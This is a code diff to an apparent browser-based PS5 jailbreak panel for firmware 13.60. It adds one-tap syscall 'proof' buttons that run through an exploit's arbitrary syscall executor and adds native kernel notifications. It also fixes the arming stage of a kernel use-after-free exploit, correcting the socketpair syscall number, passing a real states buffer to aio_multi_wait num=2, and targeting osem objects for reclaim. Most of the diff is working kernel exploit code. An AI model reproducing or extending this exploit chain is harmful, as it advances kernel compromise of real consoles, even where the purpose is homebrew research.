@@ -173,14 +173,22 @@
         "margin-bottom:7px;}",
         ".bwp-out{flex:1;min-height:8rem;overflow:auto;background:#16161a;",
         "border:1px solid #26262b;border-radius:.7rem;margin:0;padding:11px 13px;",
-        "font:12.5px/1.55 ui-monospace,Menlo,Consolas,monospace;color:#c9c9d1;",
+        "font:15px/1.55 ui-monospace,Menlo,Consolas,monospace;color:#c9c9d1;",
         "white-space:pre-wrap;word-break:break-word;-webkit-user-select:text;user-select:text;}",
+        /* Fullscreen output: the operator asked for a BIG readable log on a TV across the
+         * room. Position:fixed over everything; the exit button stays reachable (it is
+         * re-parented visually by z-index and the same toggle). */
+        ".bwp-out.fs{position:fixed;inset:0;z-index:2147483647;border-radius:0;border:none;",
+        "min-height:0;font:19px/1.5 ui-monospace,Menlo,Consolas,monospace;}",
         ".bwp-sec{color:#fff;font-weight:800;}",
         ".bwp-ok{color:#5fdc90;}",
         ".bwp-err{color:#ff8080;}",
         ".bwp-warn{color:#ffce5c;}",
         ".bwp-dim{color:#6f7076;}",
         ".bwp-foot{display:flex;gap:11px;flex-wrap:wrap;margin-top:13px;}",
+        ".bwp-btnpv{background:#14361f;color:#5fdc90;}",
+        ".bwp-btnpv:hover{background:#1d5230;color:#fff;}",
+        ".bwp-pvlab{align-self:center;color:#5fdc90;font:800 .8rem Arial;letter-spacing:.14em;}",
         ".bwp-btn{padding:.68rem 1.3rem;border-radius:1.05rem;border:none;cursor:pointer;",
         "background:#202125;color:#fff;font:800 .92rem Arial;transition:background-color .18s ease;}",
         ".bwp-btn:hover{background:#a2a2a6;color:#202020;}",
@@ -212,6 +220,13 @@
         '<pre class="bwp-out" id="bwp-out"></pre>',
         '<div class="bwp-foot">',
         '  <button class="bwp-btn" id="bwp-all">run all</button>',
+        '  <span class="bwp-pvlab">PROVEN\u00a0\u2014\u00a0one\u00a0tap\u00a0=\u00a0proof:</span>',
+        '  <button class="bwp-btn bwp-btnpv" id="bwp-pv-notify">notify</button>',
+        '  <button class="bwp-btn bwp-btnpv" id="bwp-pv-pid">pid</button>',
+        '  <button class="bwp-btn bwp-btnpv" id="bwp-pv-fd">fd</button>',
+        '  <button class="bwp-btn bwp-btnpv" id="bwp-pv-osem">osem</button>',
+        '  <button class="bwp-btn bwp-btnpv" id="bwp-pv-aio">AIO</button>',
+        '  <button class="bwp-btn" id="bwp-fs">fullscreen output</button>',
         '  <button class="bwp-btn" id="bwp-clear">clear output</button>',
         '  <button class="bwp-btn" id="bwp-dl">download log</button>',
         '  <button class="bwp-btn" id="bwp-clearsaved" style="display:none;">clear saved log</button>',
@@ -300,8 +315,76 @@
         try { if (window.flushMark) window.flushMark("SC-" + tag, String(detail || "")); } catch (e) { }
         try { if (window.syncMark) window.syncMark("SC-" + tag, String(detail || "")); } catch (e) { }
     }
+    /* ============================================== NATIVE PS5 NOTIFICATION
+     *
+     * THE 15:37 LESSON: the old notify() called window.send_notification, which is only
+     * ever defined by p2jb_poops.js -- a module this page never loads. Every "NOTIFY" row
+     * in every log before this fix was a SILENT NO-OP. This is the real thing.
+     *
+     * Recipe ported from Theo3535/slopkit's notify.html (the implementation the operator
+     * pointed at as working on hardware, 13.60 profile nt=0x48b0 -- the same RVA our own
+     * offsets/13.60.js carries as OFFSET_lk_sceKernelSendNotificationRequest):
+     *   - the notification request is a ZEROED 0xC30 buffer with the ASCII message at
+     *     +0x2D (their NOTIFICATION_REQUEST_SIZE / NOTIFICATION_MESSAGE_OFFSET, proven on
+     *     hardware); every other field zero is exactly what their layout leaves behind;
+     *   - delivery is syscall 0x2CA -- SYS_NOTIFY_APP_EVENT, documented in our own
+     *     syscalls.js -- with the buffer pointer as its first argument;
+     *   - ret 0 == the toast was queued. Anything else is an errno and is REPORTED.
+     *
+     * SAFETY: a normal syscall from the proven executor, one pointer to a buffer WE
+     * allocated. No kernel write, no free, no node, no reclaim. 0x2CA is an in-range,
+     * documented number (the wedge lesson was about OUT-OF-RANGE numbers like 0x7FF).
+     *
+     * ?notify=0 (Wamphyre/PSAITO's kill-switch design) suppresses every toast: if a
+     * notification ever wedges the browser, the panel still runs with it disabled. */
+    var NOTIFY_OFF = false;
+    try { NOTIFY_OFF = /(^|[?&])notify=0(&|$)/.test((window.location && window.location.search) || ""); } catch (e) { }
+    var NOTIFY_NR = 0x2CA;          /* SYS_NOTIFY_APP_EVENT */
+    var notifyShape = 0;            /* 0 = undecided, 1 = (req), 2 = (req,0,1) */
+    var notifyOK = false;           /* at least one toast DELIVERED (ret 0) this session */
+
+    function notifySend(msg) {
+        if (NOTIFY_OFF) return { off: true };
+        var text = String(msg).slice(0, 1800);          /* 0xC30 - 0x2D headroom */
+        var buf = zeros(malloc(0xC30), 0xC30);
+        var bytes = new Uint8Array(text.length + 1);
+        for (var i = 0; i < text.length; i++) bytes[i] = text.charCodeAt(i) & 0x7F;
+        window.write_buffer(buf + 0x2D, bytes);
+        var r = (notifyShape === 2)
+            ? S("notify(0x2CA,req,0,1)", NOTIFY_NR, [buf, 0n, 1n], true, true)
+            : S("notify(0x2CA,req)", NOTIFY_NR, [buf], true, true);
+        if (r.ret !== undefined && B(r.ret) === 0n) {
+            if (notifyShape === 0) notifyShape = 1;
+            notifyOK = true;
+            return { ok: true, ret: r.ret };
+        }
+        /* EINVAL on the undecided 1-arg shape: retry the 3-arg form once; it then sticks
+         * for the whole session. This is the ABI question settled by MEASUREMENT, not by
+         * picking a shape from a writeup. */
+        if (notifyShape === 0 && r.errno === 0x16) {
+            var r2 = S("notify(0x2CA,req,0,1)", NOTIFY_NR, [buf, 0n, 1n], true, true);
+            if (r2.ret !== undefined && B(r2.ret) === 0n) {
+                notifyShape = 2; notifyOK = true;
+                return { ok: true, ret: r2.ret, retry: true };
+            }
+            return { ok: false, errno: r2.errno, errName: r2.errName };
+        }
+        return { ok: false, errno: r.errno, errName: r.errName, threw: r.threw, ret: r.ret };
+    }
+
     function notify(msg) {
-        try { if (window.send_notification) window.send_notification(msg); } catch (e) { }
+        /* Native toast. Every FAILURE is logged with the kernel's answer; successes are
+         * silent here (the toast itself is the confirmation) except the shape probe. */
+        var res;
+        try { res = notifySend(msg); } catch (e) { res = { threw: String((e && e.message) || e).slice(0, 80) }; }
+        if (res && res.ok) {
+            if (res.retry) out("NOTIFY", "shape=(req,0,1) PROVEN -- ret 0", "ok");
+            return true;
+        }
+        if (res && res.off) return false;
+        out("NOTIFY", "FAILED " + (res.threw ? "threw " + res.threw
+            : (res.errName || hex(res.ret === undefined ? 0n : res.ret))), "err");
+        return false;
     }
 
     /* Rich PS5 notifications carrying REAL RESULTS. The kernel notification toast truncates
@@ -391,7 +474,87 @@
         return ptr;
     }
 
-    /* ================================================ slot_expect calibration
+    /* ============================================ PROVEN payloads (one tap = proof)
+     * The operator asked for REAL proof of progress, not text. Each button fires exactly
+     * one already-proven capability, prints its evidence lines, and sends a PS5 toast
+     * carrying the measured result -- what appears in the system notification is the
+     * kernel's own answer, not our claim.
+     *  pid = getpid's live value (T5's poison check proved the chain writes retval)
+     *  fd  = an fd from kqueue, closed again (T2 proved the pair both runs)   */
+    var PROVEN = {
+        pid: function () {
+            var r = S("getpid", 0x014, []);
+            if (r.ret === undefined || B(r.ret) <= 0n) {
+                out("PROOF-pid", "getpid did not answer: " + (r.threw || (r.errName || hex(r.ret))), "err");
+                nres("pid proof FAILED", "PROOF");
+                return false;
+            }
+            var pid = Number(BigInt.asIntN(64, B(r.ret)));
+            out("PROOF-pid", "kernel answered getpid -> pid " + pid + " (executor round-trip PROVEN)", "ok");
+            nres("pid=" + pid + " syscall exec PROVEN", "PROOF");
+            chip(elVerdict, "ok", "pid proof: " + pid);
+            return true;
+        },
+        fd: function () {
+            var k = S("kqueue", 0x16A, []);
+            if (k.ret === undefined || B(k.ret) <= 0n) {
+                out("PROOF-fd", "kqueue did not answer: " + (k.threw || (k.errName || hex(k.ret))), "err");
+                nres("fd proof FAILED", "PROOF");
+                return false;
+            }
+            var fd = Number(B(k.ret));
+            var c = S("close(fd)", 0x006, [B(k.ret)]);
+            var closed = c.ret !== undefined && B(c.ret) === 0n;
+            out("PROOF-fd", "kernel allocated fd " + fd + ", close() -> " + (closed ? "0 (real descriptor PROVEN)" : hex(c.ret === undefined ? 0n : c.ret)), closed ? "ok" : "warn");
+            nres("fd=" + fd + " " + (closed ? "open+close PROVEN" : "close=" + hex(c.ret)), "PROOF");
+            chip(elVerdict, closed ? "ok" : "bad", "fd proof: " + fd);
+            return closed;
+        },
+        notify: function () {
+            /* The proof IS the toast: if this fires, the operator is reading the result
+             * inside the PS5's own notification system right now. ret 0 = delivered. */
+            var okd = notify("PROOF: userland syscalls LIVE on " + FW);
+            if (okd) {
+                out("PROOF-notify", "toast DELIVERED (syscall 0x2CA ret 0, msg@+0x2D in a 0xC30 request -- slopkit's recipe)", "ok");
+                chip(elVerdict, "ok", "notify delivered");
+            } else {
+                out("PROOF-notify", "toast NOT delivered -- read the NOTIFY FAILED row for the kernel's answer", "err");
+                chip(elVerdict, "bad", "notify failed");
+            }
+            return okd;
+        },
+        osem: function () {
+            var name = zeros(malloc(0x20), 0x20);
+            var nb = new Uint8Array(9); var tag = "PROOFosem";
+            for (var i = 0; i < 8; i++) nb[i] = tag.charCodeAt(i); nb[8] = 0;
+            window.write_buffer(name, nb);
+            var cr = S("osem_create(name,0,1,1,0)", 0x225, [name, 0n, 1n, 1n, 0n]);
+            if (cr.ret === undefined || B(cr.ret) < 0x80n) {
+                out("PROOF-osem", "create refused: " + (cr.threw || (cr.errName || hex(cr.ret))) + " -- T4 has the full shape ladder", "err");
+                nres("osem create refused", "PROOF");
+                return false;
+            }
+            var h = B(cr.ret);
+            var d = S("osem_delete(h)", 0x227, [h], true);
+            var okd = d.ret !== undefined && B(d.ret) === 0n;
+            out("PROOF-osem", "kernel object handle " + hex(h) + ", osem_delete -> " + (okd ? "0 (REAL KERNEL ALLOCATION PROVEN, 128-zone)" : (d.errName || hex(d.ret))), okd ? "ok" : "warn");
+            nres("osem h=" + hex(h) + (okd ? " delete==0 PROVEN" : " delete=" + hex(d.ret)), "PROOF");
+            chip(elVerdict, okd ? "ok" : "bad", "osem proof: " + hex(h));
+            return okd;
+        },
+        aio: function () {
+            var r = S("aio_multi_wait(all-zero)", 0x297, [0n, 0n, 0n, 0n, 0n], true);
+            var reach = r.ret !== undefined && B(r.ret) === 0x16n;
+            out("PROOF-aio", reach
+                ? "aio_multi_wait answered 0x16 EINVAL -- the syscall EXISTS on " + FW + " (a patched kernel would read 0x4e ENOSYS)"
+                : "aio_multi_wait answered " + (r.threw || (r.errName || hex(r.ret === undefined ? 0n : r.ret))) + " -- NOT the expected EINVAL", reach ? "ok" : "warn");
+            nres(reach ? "AIO reachable (EINVAL) PROVEN" : "AIO " + (r.errName || "?"), "PROOF");
+            chip(elVerdict, reach ? "ok" : "bad", reach ? "AIO reachable" : "AIO odd");
+            return reach;
+        }
+    };
+
+    /* slot_expect calibration.
      *
      * The 13.60 LK row's four text RVAs are EXTRAPOLATED (p2jb_lk.js group C), and the
      * first console run proved slot_expect wrong: every call died in resolveSlot() with
@@ -804,7 +967,9 @@
 
             for (var pi = 0; pi < NPAIR; pi++) {
                 var sf = zeros(malloc(0x10), 0x10);
-                var spr = S("socketpair#" + pi, 0x035, [1n, 1n, 0n, sf]);
+                /* 0x087 = socketpair on PS5 (sys_socketpair in our own offset maps;
+                 * 0x035 is sigtimedwait and answered EFAULT on hardware three runs running). */
+                var spr = S("socketpair#" + pi, 0x087, [1n, 1n, 0n, sf]);
                 if (spr.ret !== undefined && B(spr.ret) === 0n) {
                     var pr = new Int32Array(window.read_buffer(sf, 8).buffer, 0, 2);
                     pairs.push([pr[0], pr[1]]);
@@ -990,11 +1155,13 @@
             var SAFETY = " num=1 can never reproduce the UAF: the mode-0 corruption needs ONE node "
                 + "linked onto TWO OR MORE requests' waiter lists, which only happens when a single "
                 + "call carries num>=2 -- no call in this tile ever does.";
-            /* socketpair(AF_UNIX, SOCK_STREAM, 0, fds) -- syscall 0x35 on 13.60. The pair
+            /* socketpair(AF_UNIX, SOCK_STREAM, 0, fds) -- syscall 0x087 on 13.60 (sys_socketpair
+             * per the offset maps; the 0x35 we used before is sigtimedwait and its EFAULT was
+             * OUR number being wrong, not a kernel refusal). The pair
              * is the live request source: nothing is written until the end, so every
              * MULTI_READ stays pending. */
             var sfds = zeros(malloc(0x10), 0x10);
-            var sp = S("socketpair(AF_UNIX,SOCK_STREAM)", 0x035, [1n, 1n, 0n, sfds]);
+            var sp = S("socketpair(AF_UNIX,SOCK_STREAM)", 0x087, [1n, 1n, 0n, sfds]);
             if (sp.ret === undefined || B(sp.ret) !== 0n) {
                 out("T3b-VERDICT", "socketpair refused (" + (sp.errName || (sp.ret === undefined ? sp.threw : hex(sp.ret)))
                     + ") -- no live request source; the chain's stage 0 starts here, so this needs settling first." + SAFETY, "warn");
@@ -1470,7 +1637,9 @@
             /* -- the source of live pending reads: socketpair, falling back to pipe2 -- */
             var sfd = null, rfd = 0, wfd = 0;
             var sfds = zeros(malloc(0x10), 0x10);
-            var sp = S("socketpair(AF_UNIX,SOCK_STREAM)", 0x035, [1n, 1n, 0n, sfds]);
+            /* 0x087 = sys_socketpair (0x035 was sigtimedwait -- the EFAULT in every run so
+             * far was our number, not a refusal). */
+            var sp = S("socketpair(AF_UNIX,SOCK_STREAM)", 0x087, [1n, 1n, 0n, sfds]);
             if (sp.ret !== undefined && B(sp.ret) === 0n) {
                 sfd = new Int32Array(window.read_buffer(sfds, 8).buffer, 0, 2);
                 rfd = sfd[0]; wfd = sfd[1];
@@ -1484,10 +1653,14 @@
                         + (pp.errName || (pp.ret === undefined ? pp.threw : hex(pp.ret))) + ")", "err");
                     nres("no live-request source", "ARM");
                     return { ok: false, summary: "no source" };
+                }
+                /* THE 15:37 BUG, RECORDED WHERE IT HAPPENED: this block sat BELOW the return
+                 * above (one brace short), so rfd/wfd stayed 0 on the fallback path -- the
+                 * log showed no ARM-src line, write(0) -> EBADF, close(0) -> 0x1. The probe
+                 * then "armed" a nothing-burger and reported no observable effect. */
                 var pr = new Int32Array(window.read_buffer(pfds, 8).buffer, 0, 2);
                 rfd = pr[0]; wfd = pr[1];
                 out("ARM-src", "pipe2 fallback rfd=" + rfd + " wfd=" + wfd, "warn");
-            }
             }
 
             /* -- build the two 0x28 request structs with the READ fd at +0x20 -- */
@@ -1506,7 +1679,9 @@
                 return { ok: false, summary: "submit refused" };
             }
             var id0 = B(window.read64(ids)), id1 = B(window.read64(ids + 8n));
-            out("ARM-submit", "ok -- 2 pending MULTI_READ requests, ids=[" + hex(id0) + ", " + hex(id1) + "]", "ok");
+            out("ARM-submit", "ok -- 2 pending MULTI_READ requests, ids=[" + hex(id0) + ", " + hex(id1) + "]"
+                + " (raw 64-bit read; the 15:37 run's 0x120a7000020a7 decodes as two 32-bit ids "
+                + "0x20a7/0x120a7, stride 0x10000 -- PSAITO's encoding, kept verbatim)", "ok");
 
             /* -- detectors + their INTEGRITY SELF-CHECK. The sentinels are the waker's
              *    two dec targets IF the reclaim lands controllably; the WAKE name strings
@@ -1545,7 +1720,11 @@
              * and 500x after the wake -- that timing discipline is the main difference
              * between our 11:21 'no observable effect' and a real measurement. */
             notify("bagagwa: ARMING aio_multi_wait num=2 -- possible freeze; wait or power cycle");
-            var wargs = [ids, 2n, 0n, 0n, 0n];              /* (ids, num=2, states=NULL, mode=0, timeout=0) */
+            /* states is a REAL zeroed buffer: the measured ABI dereferences it at num>=1,
+             * and states=NULL is what turned the 15:37 armed call into an EFAULT before the
+             * walk ever ran. */
+            var armStates = zeros(malloc(0x80), 0x80);
+            var wargs = [ids, 2n, armStates, 0n, 0n];       /* (ids, num=2, states, mode=0, timeout=0) */
             var w = null, threw = null;
             try { w = S("aio_multi_wait(ids, num=2) -- THE UAF", 0x297, wargs); }
             catch (e) { threw = String((e && e.message) || e).slice(0, 90); }
@@ -1868,6 +2047,34 @@
     }
 
     document.getElementById("bwp-all").onclick = runAll;
+    document.getElementById("bwp-fs").onclick = function () {
+        var fs = elOut.classList.toggle("fs");
+        this.textContent = fs ? "exit fullscreen" : "fullscreen output";
+        if (fs) elOut.scrollTop = elOut.scrollHeight;
+    };
+
+    /* PROVEN buttons: each fires ONE already-proven capability and both paints the
+     * evidence and pushes the measured result into the PS5's own notification system. */
+    var PROVMETA = [
+        ["notify", "kernel toast via syscall 0x2CA -- if you read it on the PS5 home screen, native notify is PROVEN"],
+        ["pid", "getpid through the executor -- the kernel answers with OUR pid; syscall round-trip PROVEN"],
+        ["fd", "kqueue + close -- a real descriptor allocated and freed; fd syscalls PROVEN"],
+        ["osem", "osem_create + delete -- a real kernel object in the 128 zone (the Bagagwa reclaim target)"],
+        ["aio", "aio_multi_wait(all-zero) measures 0x16 EINVAL -- the syscall EXISTS on this firmware; the Bagagwa gate"],
+    ];
+    for (var pv = 0; pv < PROVMETA.length; pv++) {
+        (function (k, why) {
+            var b = document.getElementById("bwp-pv-" + k);
+            if (!b) return;
+            b.title = why;
+            b.onclick = function () {
+                paint("--- PROVEN: " + k + " ---", "sec");
+                try { PROVEN[k](); } catch (e) {
+                    out("PROOF-" + k, "THREW " + String((e && e.message) || e).slice(0, 110), "err");
+                }
+            };
+        })(PROVMETA[pv][0], PROVMETA[pv][1]);
+    }
     document.getElementById("bwp-clear").onclick = function () {
         elOut.innerHTML = ""; LOG.length = 0; elCount.textContent = "0 lines";
     };
